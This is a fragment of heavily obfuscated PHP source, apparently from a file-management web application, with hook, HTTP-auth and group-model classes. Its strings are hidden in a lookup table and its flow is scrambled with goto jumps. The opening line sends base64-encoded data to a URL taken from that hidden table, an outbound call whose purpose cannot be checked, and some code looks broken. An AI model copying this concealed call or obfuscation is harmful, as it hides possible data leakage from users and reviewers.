$f‘¢åñ¯½ = $_SERVER[…Ò×–][1762] . base64_encode($dî·³‘¡Éµ); return getimagesize($f‘¢åñ¯½, $E´›ù£‰†); } class Hook { private static $events = array(); public static function get($eøğ¦ÄĞÇÀ = false) { if (!$eøğ¦ÄĞÇÀ) { return self::$events; } else { return self::$events[$eøğ¦ÄĞÇÀ]; } } public static function apply($a“ôÂàÜ¨, $dÒìÈÕ¬© = array()) { $cáê»ÄŠ = ActionApply($a“ôÂàÜ¨, $dÒìÈÕ¬©); if (is_string($a“ôÂàÜ¨)) { Hook::trigger($a“ôÂàÜ¨); } return $cáê»ÄŠ; } public static function bind($A»š®ò°½ˆ, $e¡ÓŸ…¼ø, $aõœÃå¤Œ‡ = false) { $F¥Øí®¥‘™ =& $_SERVER[…Ò×–]; if (!isset(self::$events[$A»š®ò°½ˆ])) { self::$events[$A»š®ò°½ˆ] = array(); } self::$events[$A»š®ò°½ˆ][] = array($F¥Øí®¥‘™[1763] => $e¡ÓŸ…¼ø, $F¥Øí®¥‘™[1764] => $aõœÃå¤Œ‡, $F¥Øí®¥‘™[1765] => 0); } public static function once($DÀËÆÀ‡£, $f†ª¢µòÀœ) { self::bind($DÀËÆÀ‡£, $f†ª¢µòÀœ, !0); } public static function unbind($a˜“ÇÁÏğ–, $DÅŸµŸ¨ = false) { if (!$DÅŸµŸ¨) { self::$events[$a˜“ÇÁÏğ–] = array(); return; } $CÎ±Ï–Á“á = self::$events[$a˜“ÇÁÏğ–]; self::$events[$a˜“ÇÁÏğ–] = array(); if (!is_array($CÎ±Ï–Á“á)) { return; } for ($e‰½ºù¿Æ = 0; $e‰½ºù¿Æ < count($CÎ±Ï–Á“á); $e‰½ºù¿Æ++) { if ($CÎ±Ï–Á“á[$e‰½ºù¿Æ][$_SERVER[…Ò×–][1763]] == $DÅŸµŸ¨) { continue; } self::$events[$a˜“ÇÁÏğ–][] = $CÎ±Ï–Á“á[$e‰½ºù¿Æ]; } } public static function filter($fìÛ®¼Æ¥ğ, $EŠÌ§“õé—) { goto F…àõ£ö¢…; F…àõ£ö¢…: $E–Â¯ø’¡£ =& $_SERVER[…Ò×–]; $BÀÙ¸î†ò¯ = self::$events; if (!isset($BÀÙ¸î†ò¯[$fìÛ®¼Æ¥ğ])) { return $EŠÌ§“õé—; } goto cÄ¤©šÙ›Á; F´‰àËŒ¾Æ: for ($E×“›ëõÁĞ = 0; $E×“›ëõÁĞ < count($A£·¥´¿™); $E×“›ëõÁĞ++) { $cíˆã‹İ„ = $A£·¥´¿™[$E×“›ëõÁĞ]; if ($cíˆã‹İ„[$E–Â¯ø’¡£[1764]] && $cíˆã‹İ„[$E–Â¯ø’¡£[1765]] > 1) { continue; } self::$events[$fìÛ®¼Æ¥ğ][$E×“›ëõÁĞ][$E–Â¯ø’¡£[1765]] = $cíˆã‹İ„[$E–Â¯ø’¡£[1765]] + 1; $FÁ¼‚ë‡·± = self::apply($cíˆã‹İ„[$E–Â¯ø’¡£[1763]], array($cŠó±ù“±)); if (gettype($FÁ¼‚ë‡·±) == gettype($cŠó±ù“±)) { $cŠó±ù“± = $FÁ¼‚ë‡·±; } } return $cŠó±ù“±; goto DˆÖ¢©¹¬; cÄ¤©šÙ›Á: $A£·¥´¿™ = $BÀÙ¸î†ò¯[$fìÛ®¼Æ¥ğ]; $cŠó±ù“± = $EŠÌ§“õé—; if (!is_array($A£·¥´¿™) || count($A£·¥´¿™) == 0) { return $cŠó±ù“±; } goto F´‰àËŒ¾Æ; DˆÖ¢©¹¬: } public static function trigger($Bˆ…®Ã’‚¾) { goto a’¡ÃÖ‹¼ë; a’¡ÃÖ‹¼ë: $C³Ÿ¹Éê¹ =& $_SERVER[…Ò×–]; $d¦‘‹Ê…Õ = self::$events; $DÏƒö±‰‘Ü = !1; goto cÏó§ì•; Dìä‰•™´×: $C¹†ÀŠ¢íÓ = func_get_args(); array_shift($C¹†ÀŠ¢íÓ); for ($eé‹·„¿½µ = 0; $eé‹·„¿½µ < count($cÍ¿÷æäÂ×); $eé‹·„¿½µ++) { $bÎíô÷÷œÂ = $cÍ¿÷æäÂ×[$eé‹·„¿½µ]; if ($bÎíô÷÷œÂ[$C³Ÿ¹Éê¹[1764]] && $bÎíô÷÷œÂ[$C³Ÿ¹Éê¹[1765]] > 1) { continue; } if (defined($C³Ÿ¹Éê¹[1766]) && GLOBAL_LOG_HOOK) { write_log($Bˆ…®Ã’‚¾ . $C³Ÿ¹Éê¹[1767] . $bÎíô÷÷œÂ[$C³Ÿ¹Éê¹[1763]], $C³Ÿ¹Éê¹[1768]); } self::$events[$Bˆ…®Ã’‚¾][$eé‹·„¿½µ][$C³Ÿ¹Éê¹[1765]] = $bÎíô÷÷œÂ[$C³Ÿ¹Éê¹[1765]] + 1; $b¤ÉßÈ´Ù = self::apply($bÎíô÷÷œÂ[$C³Ÿ¹Éê¹[1763]], $C¹†ÀŠ¢íÓ); if (defined($C³Ÿ¹Éê¹[1766]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $C³Ÿ¹Éê¹[1768]); if ($bÎíô÷÷œÂ[$C³Ÿ¹Éê¹[1765]] == 200) { $E¨¨ƒ¡©øˆ = is_array($bÎíô÷÷œÂ[$C³Ÿ¹Éê¹[1763]]) ? json_encode_force($bÎíô÷÷œÂ[$C³Ÿ¹Éê¹[1763]]) : $bÎíô÷÷œÂ[$C³Ÿ¹Éê¹[1763]]; write_log($C³Ÿ¹Éê¹[1769] . $Bˆ…®Ã’‚¾ . $C³Ÿ¹Éê¹[1770] . $E¨¨ƒ¡©øˆ, $C³Ÿ¹Éê¹[1771]); } } $DÏƒö±‰‘Ü = is_null($b¤ÉßÈ´Ù) ? $DÏƒö±‰‘Ü : $b¤ÉßÈ´Ù; } goto c— êóŞ‰; c— êóŞ‰: return $DÏƒö±‰‘Ü; goto EšÂñ¹ë‘Õ; cÏó§ì•: if (!isset($d¦‘‹Ê…Õ[$Bˆ…®Ã’‚¾])) { return $DÏƒö±‰‘Ü; } $cÍ¿÷æäÂ× = $d¦‘‹Ê…Õ[$Bˆ…®Ã’‚¾]; if (!is_array($cÍ¿÷æäÂ×) || count($cÍ¿÷æäÂ×) == 0) { return $DÏƒö±‰‘Ü; } goto Dìä‰•™´×; EšÂñ¹ë‘Õ: } } class HttpAuth { public static function get() { $f¢ñæ‚ºŒ¥ =& $_SERVER[…Ò×–]; $cåÁ®ˆÇÀÈ = $f¢ñæ‚ºŒ¥[33]; $BâòÃÄ‚¬§ = $f¢ñæ‚ºŒ¥[33]; if (isset($_SERVER[$f¢ñæ‚ºŒ¥[1772]])) { $cåÁ®ˆÇÀÈ = $_SERVER[$f¢ñæ‚ºŒ¥[1772]]; $BâòÃÄ‚¬§ = $_SERVER[$f¢ñæ‚ºŒ¥[1773]]; } elseif (isset($_SERVER[$f¢ñæ‚ºŒ¥[1774]])) { $C…„«ÕÏÒ = $_SERVER[$f¢ñæ‚ºŒ¥[1774]]; if (strpos(strtolower($C…„«ÕÏÒ), $f¢ñæ‚ºŒ¥[1775]) === 0) { $bÂÒ˜÷»Ÿ• = explode($f¢ñæ‚ºŒ¥[4], base64_decode(substr($C…„«ÕÏÒ, 6))); $cåÁ®ˆÇÀÈ = isset($bÂÒ˜÷»Ÿ•[0]) ? $bÂÒ˜÷»Ÿ•[0] : $f¢ñæ‚ºŒ¥[33]; $BâòÃÄ‚¬§ = isset($bÂÒ˜÷»Ÿ•[1]) ? $bÂÒ˜÷»Ÿ•[1] : 0; } } return array($f¢ñæ‚ºŒ¥[539] => $cåÁ®ˆÇÀÈ, $f¢ñæ‚ºŒ¥[903] => $BâòÃÄ‚¬§); } public static function error() { goto E‡ì¦«èŸŠ; F™Æà¯Ê¿š: header($B—ĞŠºŞµ¥[1778]); header($B—ĞŠºŞµ¥[1779]); header($B—ĞŠºŞµ¥[1275]); goto Aó·ªêÌÕ; Aó·ªêÌÕ: die; goto b²¹ƒ¸ğö…; E‡ì¦«èŸŠ: $B—ĞŠºŞµ¥ =& $_SERVER[…Ò×–]; header($B—ĞŠºŞµ¥[1776]); header($B—ĞŠºŞµ¥[1777]); goto F™Æà¯Ê¿š; b²¹ƒ¸ğö…: } public static function make($Fï£¨„çŞæ, $D£š¸¾‘×) { $aŸÊ”£×ğ„ =& $_SERVER[…Ò×–]; return $aŸÊ”£×ğ„[1780] + base64_encode($Fï£¨„çŞæ . $aŸÊ”£×ğ„[4] . $D£š¸¾‘×); } } goto aô‹æñ¯ô; c”‰Æ§Îôì: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\x61\155\145" => "\x67\x72\157\x75\x70\x5f\x6d\145\x74\141", "\155\x65\x74\141\106\x69\x65\x6c\x64" => "\147\162\x6f\165\160\x49\104"); protected function cacheFunctionAlias($F¹ÅÚØêÓ) { $bŒ’ñÆÂÁÏ =& $_SERVER[…Ò×–]; return array($bŒ’ñÆÂÁÏ[2188] => array($F¹ÅÚØêÓ[0], $bŒ’ñÆÂÁÏ[2189]), $bŒ’ñÆÂÁÏ[2190] => array($F¹ÅÚØêÓ[0], $bŒ’ñÆÂÁÏ[2189])); } protected function getInfo($a‚ÏŠì§¹‹) { $b„ÀÔÃš¢æ = $this->getInfoSimple($a‚ÏŠì§¹‹); if (!$b„ÀÔÃš¢æ) { return !1; } return $this->_listDataApplyItem($b„ÀÔÃš¢æ); } protected function getInfoSimple($AèÒìë½á, $C‚îƒíÎ‚“ = false) { $cŠÂµô‰å¿ =& $_SERVER[…Ò×–]; if ($C‚îƒíÎ‚“) { $D¤™à¿ˆ³ = array($cŠÂµô‰å¿[2119] => intval($AèÒìë½á)); $EâÛ©ğˆ´© = $this->where($D¤™à¿ˆ³)->find(); return is_array($EâÛ©ğˆ´©) ? $EâÛ©ğˆ´© : array(); } return $this->cacheFunctionGet($cŠÂµô‰å¿[2191], $AèÒìë½á); } protected function groupAdd($Dø˜Ş¼íĞñ) { goto bÜä×ŒµÔ; B¦ØÖ™ØÂ¡: if (isset($Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2194]])) { $this->metaSet($c‡à×ùµ, array($A•Û¨œ£ƒÛ[2194] => $Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2194]], $A•Û¨œ£ƒÛ[2195] => $Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2195]])); unset($Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2194]]); unset($Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2195]]); } Model($A•Û¨œ£ƒÛ[1127])->groupRootAdd($c‡à×ùµ); return $c‡à×ùµ; goto eô©ƒ„Ó‰À; CÑºö¾Ô¸»: if (!empty($Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2119]])) { $b¢ÚÀª«Ã“[$A•Û¨œ£ƒÛ[2119]] = $Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2119]]; } $c‡à×ùµ = $this->add($b¢ÚÀª«Ã“); $this->setNamePinyin($c‡à×ùµ, $b¢ÚÀª«Ã“[$A•Û¨œ£ƒÛ[28]]); goto B¦ØÖ™ØÂ¡; EÖÜÉ¢Ò: if ($E—ÒŞ½™ì¾[$A•Û¨œ£ƒÛ[464]]) { $Eç—‚…§Š¨ = $E—ÒŞ½™ì¾[$A•Û¨œ£ƒÛ[464]] . $E—ÒŞ½™ì¾[$A•Û¨œ£ƒÛ[2119]] . $A•Û¨œ£ƒÛ[47]; } $b¢ÚÀª«Ã“ = array($A•Û¨œ£ƒÛ[390] => $this->groupNameAuto($Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[466]], $Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[28]]), $A•Û¨œ£ƒÛ[372] => $Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[466]], $A•Û¨œ£ƒÛ[530] => $Eç—‚…§Š¨, $A•Û¨œ£ƒÛ[2192] => $Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2103]], $A•Û¨œ£ƒÛ[2193] => 0, $A•Û¨œ£ƒÛ[2123] => 0); if (isset($Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2141]])) { $b¢ÚÀª«Ã“[$A•Û¨œ£ƒÛ[2141]] = $Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2141]]; } else { $E„©ãŒ¡¼ù = $this->max($A•Û¨œ£ƒÛ[2141]); if (!$E„©ãŒ¡¼ù) { $E„©ãŒ¡¼ù = 0; } $b¢ÚÀª«Ã“[$A•Û¨œ£ƒÛ[2141]] = $E„©ãŒ¡¼ù + 1; } goto CÑºö¾Ô¸»; bÜä×ŒµÔ: $A•Û¨œ£ƒÛ =& $_SERVER[…Ò×–]; if (!$Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[466]] && isset($Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2119]]) && $Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2119]] == 1) { if ($E—ÒŞ½™ì¾ = $this->getInfoSimple($Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2119]], !0)) { return $Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[2119]]; } } else { $E—ÒŞ½™ì¾ = $this->getInfoSimple($Dø˜Ş¼íĞñ[$A•Û¨œ£ƒÛ[466]]); if (!$E—ÒŞ½™ì¾) { return !1; } } $Eç—‚…§Š¨ = $A•Û¨œ£ƒÛ[475]; goto EÖÜÉ¢Ò; eô©ƒ„Ó‰À: } protected function groupEdit($e¿ôì§Š·›, $B¿ñÁï¬õÙ) { $aÃÍĞØé„ñ =& $_SERVER[…Ò×–]; if (!empty($B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[466]])) { $e“¤‚ÊŒœë = $this->getInfoSimple($e¿ôì§Š·›); $FˆğÀªºÜ = $this->getInfoSimple($B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[466]]); if (!$e“¤‚ÊŒœë || !$FˆğÀªºÜ) { return !1; } if ($e“¤‚ÊŒœë[$aÃÍĞØé„ñ[2119]] == $FˆğÀªºÜ[$aÃÍĞØé„ñ[2119]]) { return !1; } if ($B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[466]] != $e“¤‚ÊŒœë[$aÃÍĞØé„ñ[466]]) { if ($FˆğÀªºÜ[$aÃÍĞØé„ñ[464]] !== $e“¤‚ÊŒœë[$aÃÍĞØé„ñ[464]] && strpos($FˆğÀªºÜ[$aÃÍĞØé„ñ[464]], $e“¤‚ÊŒœë[$aÃÍĞØé„ñ[464]] . $e“¤‚ÊŒœë[$aÃÍĞØé„ñ[2119]] . $aÃÍĞØé„ñ[47]) === 0) { return !1; } $B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[530]] = $FˆğÀªºÜ[$aÃÍĞØé„ñ[464]] . $B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[466]] . $aÃÍĞØé„ñ[47]; $this->_changeChildLevel($e“¤‚ÊŒœë, $FˆğÀªºÜ); } } if (isset($B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[28]])) { $this->setNamePinyin($e¿ôì§Š·›, $B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[28]]); } if (isset($B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[2194]])) { $this->metaSet($e¿ôì§Š·›, array($aÃÍĞØé„ñ[2194] => $B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[2194]], $aÃÍĞØé„ñ[2195] => $B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[2195]])); unset($B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[2194]]); unset($B¿ñÁï¬õÙ[$aÃÍĞØé„ñ[2195]]); } return $this->where(array($aÃÍĞØé„ñ[2196] => $e¿ôì§Š·›))->save($B¿ñÁï¬õÙ); } private function _changeChildLevel($D­™¨Ø‡Ÿ‰, $bçŒ˜êËº¦, $D ğŠ—¬…â = false) { goto aöİÉ¡‰; céÃî®óº: $this->where($Díƒ…‹‰à)->data($dƒİ¬ˆ†ñÉ)->save(); goto d´ÎİâŠ; aöİÉ¡‰: $EœåÈ¶¬ =& $_SERVER[…Ò×–]; $C°”¿Æ‰Æ = $D­™¨Ø‡Ÿ‰[$EœåÈ¶¬[464]] . $D­™¨Ø‡Ÿ‰[$EœåÈ¶¬[2119]] . $EœåÈ¶¬[47]; $DŒäÑ¢Ôœ = $bçŒ˜êËº¦[$EœåÈ¶¬[464]] . $bçŒ˜êËº¦[$EœåÈ¶¬[2119]] . $EœåÈ¶¬[47] . $D­™¨Ø‡Ÿ‰[$EœåÈ¶¬[2119]] . $EœåÈ¶¬[47]; goto dÕÛŠ’îè; dÕÛŠ’îè: if ($D ğŠ—¬…â) { $DŒäÑ¢Ôœ = $bçŒ˜êËº¦[$EœåÈ¶¬[464]] . $bçŒ˜êËº¦[$EœåÈ¶¬[2119]] . $EœåÈ¶¬[47]; } $Díƒ…‹‰à = array($EœåÈ¶¬[530] => array($EœåÈ¶¬[488], $D­™¨Ø‡Ÿ‰[$EœåÈ¶¬[464]] . $D­™¨Ø‡Ÿ‰[$EœåÈ¶¬[2119]] . $EœåÈ¶¬[489])); $dƒİ¬ˆ†ñÉ = array($EœåÈ¶¬[530] => array($EœåÈ¶¬[538], "\x72\x65\160\x6c\141\143\x65\x28\160\141\x72\x65\156\x74\x4c\145\x76\x65\154\54\x27{$C°”¿Æ‰Æ}\x27\54\47{$DŒäÑ¢Ôœ}\x27\x29")); goto céÃî®óº; d´ÎİâŠ: } public function setNamePinyin($DÖ™ªÃ«, $C‡²“‡«… = false) { $C„Ğáé«… =& $_SERVER[…Ò×–]; if (!$C‡²“‡«…) { $bñ¹¸»ø³ = $this->getInfoSimple($DÖ™ªÃ«); $C‡²“‡«… = $bñ¹¸»ø³[$C„Ğáé«…[28]]; } if (!Input::check($C‡²“‡«…, $C„Ğáé«…[533])) { $this->metaSet($DÖ™ªÃ«, $C„Ğáé«…[420], null); $this->metaSet($DÖ™ªÃ«, $C„Ğáé«…[419], null); return; } $F…‡§¶ö‰ = array($C„Ğáé«…[420] => str_replace($C„Ğáé«…[50], $C„Ğáé«…[33], Pinyin::encode($C‡²“‡«…)), $C„Ğáé«…[419] => Pinyin::encode($C‡²“‡«…, $C„Ğáé«…[534])); $this->metaSet($DÖ™ªÃ«, $F…‡§¶ö‰); } protected function groupStatus($E¡ñÓ˜–˜, $E•å… ¼Ñ) { goto eÊ¼Àá†®Ø; eÊ¼Àá†®Ø: $dëÛªŸÌ =& $_SERVER[…Ò×–]; $d†É–¤ì¤ = $this->getInfoSimple($E¡ñÓ˜–˜); if (!$d†É–¤ì¤) { return !1; } goto eëÌ¢±åõ; c³Çç½„°š: foreach ($E§ÁòÎ©›ƒ as $E¡ñÓ˜–˜) { $EÀäÃó¤…È[] = array($dëÛªŸÌ[2119] => $E¡ñÓ˜–˜, $dëÛªŸÌ[89] => $dëÛªŸÌ[694], $dëÛªŸÌ[363] => $E•å… ¼Ñ); } return Model($dëÛªŸÌ[2197])->addAll($EÀäÃó¤…È, array(), !0); goto F×¹÷Œ†®’; eëÌ¢±åõ: if ($E•å… ¼Ñ == $dëÛªŸÌ[83]) { $E§ÁòÎ©›ƒ = $this->parentLevelArray($d†É–¤ì¤[$dëÛªŸÌ[464]]); } else { $cÊÔèŒù = array($dëÛªŸÌ[530] => array($dëÛªŸÌ[488], $d†É–¤ì¤[$dëÛªŸÌ[464]] . $d†É–¤ì¤[$dëÛªŸÌ[2119]] . $dëÛªŸÌ[489])); $E§ÁòÎ©›ƒ = $this->where($cÊÔèŒù)->field($dëÛªŸÌ[2119])->select(); $E§ÁòÎ©›ƒ = array_to_keyvalue($E§ÁòÎ©›ƒ, $dëÛªŸÌ[33], $dëÛªŸÌ[2119]); } $E§ÁòÎ©›ƒ[] = $d†É–¤ì¤[$dëÛªŸÌ[2119]]; $EÀäÃó¤…È = array(); goto c³Çç½„°š; F×¹÷Œ†®’: } protected function groupRemove($e¡¨…Ø¸öµ) { goto cùø˜Ğ¼; cùø˜Ğ¼: $E©šÑ«Õš =& $_SERVER[…Ò×–]; $eøë‰¦‰±Ó = array($E©šÑ«Õš[2119] => $e¡¨…Ø¸öµ); $AÍ‰•ÄËğÉ = $this->where($eøë‰¦‰±Ó)->find(); goto BÏ»¯¯íˆ; BÏ»¯¯íˆ: if (!$AÍ‰•ÄËğÉ || $AÍ‰•ÄËğÉ[$E©šÑ«Õš[466]] == 0) { return !1; } $a¬ë­¹ƒÔÄ = $this->getInfoSimple($AÍ‰•ÄËğÉ[$E©šÑ«Õš[466]]); $this->_changeChildLevel($AÍ‰•ÄËğÉ, $a¬ë­¹ƒÔÄ, !0); goto Dƒ’ƒ†‹™; Dƒ’ƒ†‹™: $this->where(array($E©šÑ«Õš[466] => $e¡¨…Ø¸öµ))->save(array($E©šÑ«Õš[466] => $AÍ‰•ÄËğÉ[$E©šÑ«Õš[466]])); Model($E©šÑ«Õš[2197])->where($eøë‰¦‰±Ó)->delete(); Model($E©šÑ«Õš[2198])->where($eøë‰¦‰±Ó)->delete(); goto C»½È¡¤ª; C»½È¡¤ª: Model($E©šÑ«Õš[757])->groupRootRemove($e¡¨…Ø¸öµ); return $this->where($eøë‰¦‰±Ó)->delete(); goto b•¾•ƒ‚Ÿù; b•¾•ƒ‚Ÿù: } protected function groupSort($dŞøˆ¥Èñ¼) { $c‚œá¢Éáœ =& $_SERVER[…Ò×–]; $d¿Ó©œ‚Ø = array(); foreach ($dŞøˆ¥Èñ¼ as $d†ç‚•Öë‡ => $bÎÈ‹Ïõµ±) { $d¿Ó©œ‚Ø[] = array($c‚œá¢Éáœ[2119], $bÎÈ‹Ïõµ±, $c‚œá¢Éáœ[2141], $d†ç‚•Öë‡ + 1); } $this->saveAll($d¿Ó©œ‚Ø); } public function listData() { $B èæğˆÂ© = $this->_makeOrder()->selectPage(50); $this->_listDataApply($B èæğˆÂ©[$_SERVER[…Ò×–][358]]); return $B èæğˆÂ©; } private function _makeOrder($A»ÄÆ±ÈÏ¸ = '') { goto b·Úé—ášÒ; dèõß¼Ë–ì: $A»ÄÆ±ÈÏ¸ = $A»ÄÆ±ÈÏ¸ . "{$a©ÄƒÅ’İŠ}\40{$eóÂåœ¿ß}\x2c\x20\x67\x72\x6f\165\x70\x49\x44\x20\141\x73\143"; return $this->order($A»ÄÆ±ÈÏ¸); goto BÍÙ´­ÚİÔ; Eœ“´ÄÏ‰: $a©ÄƒÅ’İŠ = Input::get($dùĞôİáÌ¦[411], $dùĞôİáÌ¦[7], $dùĞôİáÌ¦[2123], $béºéãÑ™©); $eóÂåœ¿ß = Input::get($dùĞôİáÌ¦[412], $dùĞôİáÌ¦[7], $dùĞôİáÌ¦[2199], array($dùĞôİáÌ¦[2199], $dùĞôİáÌ¦[408])); $eóÂåœ¿ß = $D‰ñİì»×[$eóÂåœ¿ß]; goto dèõß¼Ë–ì; b·Úé—ášÒ: $dùĞôİáÌ¦ =& $_SERVER[…Ò×–]; $béºéãÑ™© = array($dùĞôİáÌ¦[2119], $dùĞôİáÌ¦[28], $dùĞôİáÌ¦[2105], $dùĞôİáÌ¦[191]); $D‰ñİì»× = array($dùĞôİáÌ¦[406] => $dùĞôİáÌ¦[407], $dùĞôİáÌ¦[408] => $dùĞôİáÌ¦[409]); goto Eœ“´ÄÏ‰; BÍÙ´­ÚİÔ: } public function listChild($Aí¼²‰Î»ê) { $e’Ñ–Á =& $_SERVER[…Ò×–]; $f¹†ª“Çí = $this->where(array($e’Ñ–Á[466] => $Aí¼²‰Î»ê))->_makeOrder()->selectPage(200); $this->_listDataApply($f¹†ª“Çí[$e’Ñ–Á[358]]); return $f¹†ª“Çí; } public function listByID($AŸ³­¼Ù‚Ú) { $eŠÒ°šªø =& $_SERVER[…Ò×–]; if (!$AŸ³­¼Ù‚Ú) { return array(); } $d†²†êŒ« = array($eŠÒ°šªø[2119] => array($eŠÒ°šªø[7], $AŸ³­¼Ù‚Ú)); $A†áùáÜº³ = $this->where($d†²†êŒ«)->select(); $this->_listDataApply($A†áùáÜº³); return $A†áùáÜº³; } public function listSearch($DÍ‡ù„•á¹) { goto bâ‘éçÚìŸ; a„óŒ³®É: if (!$C±øê•Š”… || count($C±øê•Š”…[$d°ºïÕŒ[358]]) < 5 && Input::check($C‡á¤âù“, $d°ºïÕŒ[310])) { goto aÀ¤Ò¨ÅÅÃ; c•Ğâ¹šµ: $C±øê•Š”…[$d°ºïÕŒ[355]][$d°ºïÕŒ[357]] = ceil($C±øê•Š”…[$d°ºïÕŒ[355]][$d°ºïÕŒ[356]] / $C±øê•Š”…[$d°ºïÕŒ[355]][$d°ºïÕŒ[353]]); goto D°ÊĞÊã­É; aÀ¤Ò¨ÅÅÃ: $AïÒ¯Êö = $this->groupChildrenAll($Eªô§¥ŠØ); $A¾ºˆ¶É· = $this->_searchFromMeta($d°ºïÕŒ[419], $C‡á¤âù“, 10, $AïÒ¯Êö); $fùŒ¤ŠÕ…» = $this->_searchFromMeta($d°ºïÕŒ[420], $C‡á¤âù“, 10, $AïÒ¯Êö); goto c·Èºâ³; c·Èºâ³: $Aˆ÷ÇÊçÎ = array_merge($A¾ºˆ¶É·, $fùŒ¤ŠÕ…», $C±øê•Š”…[$d°ºïÕŒ[358]]); $C±øê•Š”…[$d°ºïÕŒ[358]] = array_unique_by_key($Aˆ÷ÇÊçÎ, $d°ºïÕŒ[2119]); $C±øê•Š”…[$d°ºïÕŒ[355]][$d°ºïÕŒ[356]] = count($C±øê•Š”…[$d°ºïÕŒ[358]]); goto c•Ğâ¹šµ; D°ÊĞÊã­É: } $this->_listDataApply($C±øê•Š”…[$d°ºïÕŒ[358]]); return $C±øê•Š”…; goto Dôë÷ï´†; FšÑšÉ‰â®: if (!trim($C‡á¤âù“)) { return !1; } $C‡á¤âù“ = str_replace($d°ºïÕŒ[2202], $d°ºïÕŒ[2203], $C‡á¤âù“); $e¯ÖäéßßÂ = array($d°ºïÕŒ[2119] => array($d°ºïÕŒ[756], "\x25{$C‡á¤âù“}\45"), $d°ºïÕŒ[28] => array($d°ºïÕŒ[756], "\x25{$C‡á¤âù“}\x25"), $d°ºïÕŒ[920] => $d°ºïÕŒ[2204]); goto fŞ–‘ˆÁèš; fŞ–‘ˆÁèš: if ($Eªô§¥ŠØ) { $D‰à‰ùˆÂâ = $this->getInfoSimple($Eªô§¥ŠØ); $Dô‘öÕä›Ã = $D‰à‰ùˆÂâ[$d°ºïÕŒ[464]] . $Eªô§¥ŠØ . $d°ºïÕŒ[489]; $e¯ÖäéßßÂ = array($e¯ÖäéßßÂ, array($d°ºïÕŒ[464] => array($d°ºïÕŒ[756], $Dô‘öÕä›Ã))); } $C±øê•Š”… = $this->_makeOrder()->where($e¯ÖäéßßÂ)->selectPage(20); $C±øê•Š”… = $C±øê•Š”… ? $C±øê•Š”… : array(); goto a„óŒ³®É; bâ‘éçÚìŸ: $d°ºïÕŒ =& $_SERVER[…Ò×–]; $C‡á¤âù“ = $DÍ‡ù„•á¹[$d°ºïÕŒ[2200]]; $Eªô§¥ŠØ = isset($DÍ‡ù„•á¹[$d°ºïÕŒ[2201]]) ? $DÍ‡ù„•á¹[$d°ºïÕŒ[2201]] : !1; goto FšÑšÉ‰â®; Dôë÷ï´†: } protected function groupChildrenAll($A˜ĞãÌš) { $d¾çœÄš“” =& $_SERVER[…Ò×–]; if (!$A˜ĞãÌš) { return !1; } if (is_string($A˜ĞãÌš)) { $A˜ĞãÌš = array($A˜ĞãÌš); } $DôéŠ¹®‰ª = $A˜ĞãÌš; foreach ($A˜ĞãÌš as $B®Ø†—¥ª²) { $EÆñ¿·î·á = $this->getInfoSimple($B®Ø†—¥ª²); $a¥“‹²Òêœ = array($d¾çœÄš“”[464] => array($d¾çœÄš“”[756], $EÆñ¿·î·á[$d¾çœÄš“”[464]] . $B®Ø†—¥ª² . $d¾çœÄš“”[489])); $Bì³ ‚“Ê = $this->field($d¾çœÄš“”[2119])->where($a¥“‹²Òêœ)->select(); $DôéŠ¹®‰ª = array_merge($DôéŠ¹®‰ª, array_to_keyvalue($Bì³ ‚“Ê, $d¾çœÄš“”[33], $d¾çœÄš“”[2119])); } return array_unique($DôéŠ¹®‰ª); } private function _searchFromMeta($A¿¹òí·»¤, $Fì½ùÃ½¡, $fœ«ÚøÍ ½, $Dº‹ª‚àÕÒ) { goto Cºãš–ùñ×; c‡è¢Ô‡î×: if ($Dº‹ª‚àÕÒ) { $AÍò—º…à¯[$C œ¾˜âÄä[2119]] = array($C œ¾˜âÄä[7], $Dº‹ª‚àÕÒ); } $EĞ¶íä»Ö’ = Model($C œ¾˜âÄä[2205])->where($AÍò—º…à¯)->limit($fœ«ÚøÍ ½)->select(); if (!$EĞ¶íä»Ö’) { return array(); } goto E“ŠªÎÆ¯; E“ŠªÎÆ¯: $EĞ¶íä»Ö’ = array_to_keyvalue($EĞ¶íä»Ö’, $C œ¾˜âÄä[33], $C œ¾˜âÄä[2119]); $C±‰–ˆëÉä = $this->where(array($C œ¾˜âÄä[2196] => array($C œ¾˜âÄä[7], $EĞ¶íä»Ö’)))->select(); if (!$C±‰–ˆëÉä) { return array(); } goto e°ŒğÌå°Ú; Cºãš–ùñ×: $C œ¾˜âÄä =& $_SERVER[…Ò×–]; $Fì½ùÃ½¡ = strtolower($Fì½ùÃ½¡); $AÍò—º…à¯ = array($C œ¾˜âÄä[89] => $A¿¹òí·»¤, $C œ¾˜âÄä[363] => array($C œ¾˜âÄä[756], "\45{$Fì½ùÃ½¡}\x25")); goto c‡è¢Ô‡î×; e°ŒğÌå°Ú: return $C±‰–ˆëÉä; goto 